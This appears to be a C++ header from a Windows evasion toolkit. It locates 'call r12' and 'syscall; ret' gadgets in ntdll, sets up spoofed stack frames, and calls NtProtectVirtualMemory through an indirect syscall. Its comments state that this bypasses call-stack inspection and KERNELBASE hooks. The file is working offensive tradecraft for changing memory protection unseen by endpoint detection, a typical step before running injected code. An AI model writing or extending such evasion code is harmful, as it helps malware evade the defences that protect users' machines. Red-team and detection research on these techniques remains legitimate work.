#pragma once
#include <windows.h>

struct SpoofContext {
    PVOID Gadget;            // 'call r12' gadget in ntdll
    PVOID SyscallGadget;     // 'syscall; ret' gadget in ntdll
    PVOID Frame1;
    PVOID Frame2;
    BOOL  Ready;
};

struct PatchCall {
    PVOID  Function;
    DWORD  nArgs;
    PVOID  Gadget;
    PVOID  Args[8];
};

extern "C" void Do_Call(PatchCall* call);
extern "C" void Fixup();
extern "C" void NtProtectVirtualMemory_Indirect(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect, PVOID SyscallGadget);

static BOOL InitSpoofContext(SpoofContext* ctx) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    PBYTE base = NULL;
    DWORD size = 0;

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0) {
            base = (PBYTE)hNtdll + sec[i].VirtualAddress;
            size = sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!base) return FALSE;

    ctx->Gadget = NULL;
    ctx->SyscallGadget = NULL;
    ctx->Ready = FALSE;

    // Search for 'call r12' (41 FF D4) and 'syscall; ret' (0F 05 C3)
    for (PBYTE cur = base; cur <= base + size - 3; cur++) {
        if (!ctx->Gadget && cur[0] == 0x41 && cur[1] == 0xFF && cur[2] == 0xD4) {
            ctx->Gadget = cur;
        }
        if (!ctx->SyscallGadget && cur[0] == 0x0F && cur[1] == 0x05 && cur[2] == 0xC3) {
            ctx->SyscallGadget = cur;
        }
        if (ctx->Gadget && ctx->SyscallGadget) break;
    }

    if (ctx->Gadget && ctx->SyscallGadget) {
        ctx->Ready = TRUE;
        printf("[+] Gadget : %p\n", ctx->Gadget);
        printf("[+] SyscallGadget : %p\n", ctx->SyscallGadget);
    }

    ctx->Frame1 = (PVOID)GetProcAddress(hNtdll, "RtlUserThreadStart");
    ctx->Frame2 = (PVOID)GetProcAddress(hNtdll, "RtlInitializeExceptionChain");
    if (ctx->Frame1) printf("[+] Frame1 : %p\n", ctx->Frame1);
    if (ctx->Frame2) printf("[+] Frame2 : %p\n", ctx->Frame2);

    return ctx->Ready;
}

// VirtualProtect via indirect syscall + return address spoofing
// Bypasses both:
//   - Call stack inspection (no userland address in return chain)
//   - KERNELBASE detection (indirect syscall skips it)
static NTSTATUS SpoofedNtProtectVirtualMemory(
    SpoofContext* ctx, HANDLE process, PVOID* baseAddr,
    PSIZE_T regionSize, ULONG newProtect, PULONG oldProtect) {

    if (!ctx->Ready) {
        // Fallback to regular VirtualProtect
        return VirtualProtect(*baseAddr, *regionSize, newProtect, oldProtect)
                   ? STATUS_SUCCESS : -1;
    }

    // Use combined spoofing + indirect syscall
    NtProtectVirtualMemory_Indirect(process, baseAddr, regionSize,
                                     newProtect, oldProtect, ctx->SyscallGadget);
    return STATUS_SUCCESS;
}
